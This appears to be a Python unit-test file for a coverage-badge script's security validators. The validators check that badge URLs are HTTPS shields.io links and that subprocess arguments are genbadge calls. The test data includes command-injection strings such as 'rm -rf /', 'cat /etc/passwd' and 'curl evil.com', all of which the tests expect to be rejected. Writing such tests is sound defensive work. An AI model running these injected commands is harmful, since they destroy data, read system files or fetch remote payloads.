"""Unit tests for coverage script security functions."""

# Import the functions we need to test
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from generate_coverage_badge import _validate_subprocess_args, _validate_url


class TestURLValidation:
    """Test URL validation for security."""

    def test_validate_url_valid_shields_https(self):
        """Test that valid shields.io HTTPS URLs are accepted."""
        valid_urls = [
            "https://img.shields.io/badge/coverage-85.0%25-brightgreen.svg",
            "https://shields.io/badge/test-value-color.svg",
            "https://img.shields.io/static/v1?label=coverage&message=85%&color=green",
        ]

        for url in valid_urls:
            assert _validate_url(url) is True, f"Expected {url} to be valid"

    def test_validate_url_invalid_scheme(self):
        """Test that non-HTTPS URLs are rejected."""
        invalid_urls = [
            "http://img.shields.io/badge/coverage-85.0%25-brightgreen.svg",
            "ftp://img.shields.io/badge/test.svg",
            "file:///local/path/badge.svg",
            "javascript:alert('xss')",
        ]

        for url in invalid_urls:
            assert _validate_url(url) is False, f"Expected {url} to be invalid"

    def test_validate_url_invalid_domain(self):
        """Test that non-shields.io domains are rejected."""
        invalid_urls = [
            "https://evil.com/badge.svg",
            "https://shields.io.evil.com/badge.svg",
            "https://img.badgemaker.com/badge.svg",
            "https://example.com/shields.io/badge.svg",
        ]

        for url in invalid_urls:
            assert _validate_url(url) is False, f"Expected {url} to be invalid"

    def test_validate_url_malformed(self):
        """Test that malformed URLs are rejected."""
        invalid_urls = [
            "not-a-url",
            "",
            "://missing-scheme",
            "https://",
        ]

        for url in invalid_urls:
            assert _validate_url(url) is False, f"Expected {url} to be invalid"


class TestSubprocessValidation:
    """Test subprocess argument validation."""

    def test_validate_subprocess_args_valid_genbadge(self):
        """Test that valid genbadge commands are accepted."""
        valid_cmd = [
            sys.executable,
            "-m",
            "genbadge",
            "coverage",
            "-i",
            "/tmp/coverage.xml",
            "-o",
            "/tmp/badge.svg",
        ]

        assert _validate_subprocess_args(valid_cmd) is True

    def test_validate_subprocess_args_wrong_executable(self):
        """Test that commands with wrong executable are rejected."""
        invalid_cmd = [
            "/usr/bin/python3",  # Not sys.executable
            "-m",
            "genbadge",
            "coverage",
        ]

        assert _validate_subprocess_args(invalid_cmd) is False

    def test_validate_subprocess_args_not_module_call(self):
        """Test that non-module calls are rejected."""
        invalid_cmds = [
            [sys.executable, "script.py"],  # Direct script execution
            [sys.executable, "-c", "print('hello')"],  # Code execution
            [sys.executable],  # No arguments
        ]

        for cmd in invalid_cmds:
            assert _validate_subprocess_args(cmd) is False

    def test_validate_subprocess_args_wrong_module(self):
        """Test that non-genbadge modules are rejected."""
        invalid_cmds = [
            [sys.executable, "-m", "pip", "install", "malware"],
            [sys.executable, "-m", "subprocess", "run", "rm -rf /"],
            [sys.executable, "-m", "os", "system", "evil_command"],
        ]

        for cmd in invalid_cmds:
            assert _validate_subprocess_args(cmd) is False

    def test_validate_subprocess_args_dangerous_characters(self):
        """Test that commands with dangerous characters are rejected."""
        dangerous_cmds = [
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file; rm -rf /"],
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file | cat /etc/passwd"],
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file && malicious_cmd"],
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file`evil`"],
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file$HOME"],
        ]

        for cmd in dangerous_cmds:
            assert _validate_subprocess_args(cmd) is False

    def test_validate_subprocess_args_empty_or_none(self):
        """Test that empty or None commands are rejected."""
        assert _validate_subprocess_args([]) is False
        assert _validate_subprocess_args(None) is False

    def test_validate_subprocess_args_minimal_valid(self):
        """Test minimal valid command structure."""
        minimal_cmd = [sys.executable, "-m", "genbadge"]
        assert _validate_subprocess_args(minimal_cmd) is True


@pytest.mark.unit
class TestCoverageSecurityIntegration:
    """Integration tests for coverage script security."""

    def test_security_functions_exist(self):
        """Test that security functions are properly imported."""
        # This ensures our imports work and functions exist
        assert callable(_validate_url)
        assert callable(_validate_subprocess_args)

    def test_realistic_genbadge_command(self):
        """Test a realistic genbadge command passes validation."""
        realistic_cmd = [
            sys.executable,
            "-m",
            "genbadge",
            "coverage",
            "-i",
            str(Path("/tmp") / "temp_coverage.xml"),
            "-o",
            str(Path("/tmp") / "coverage-badge.svg"),
        ]

        assert _validate_subprocess_args(realistic_cmd) is True

    def test_realistic_shields_url(self):
        """Test a realistic shields.io URL passes validation."""
        realistic_url = "https://img.shields.io/badge/coverage-87.3%25-brightgreen.svg"
        assert _validate_url(realistic_url) is True

    def test_security_prevents_common_attacks(self):
        """Test that security functions prevent common attack vectors."""
        # Command injection attempts
        attack_cmds = [
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file; curl evil.com"],
            [sys.executable, "-m", "genbadge", "coverage", "-i", "/tmp/file && wget malware"],
        ]

        for cmd in attack_cmds:
            assert _validate_subprocess_args(cmd) is False

        # URL redirection attempts
        attack_urls = [
            "https://shields.io.evil.com/redirect",
            "https://img.evil.com/badge.svg",
            "http://img.shields.io/badge.svg",  # HTTP instead of HTTPS
        ]

        for url in attack_urls:
            assert _validate_url(url) is False
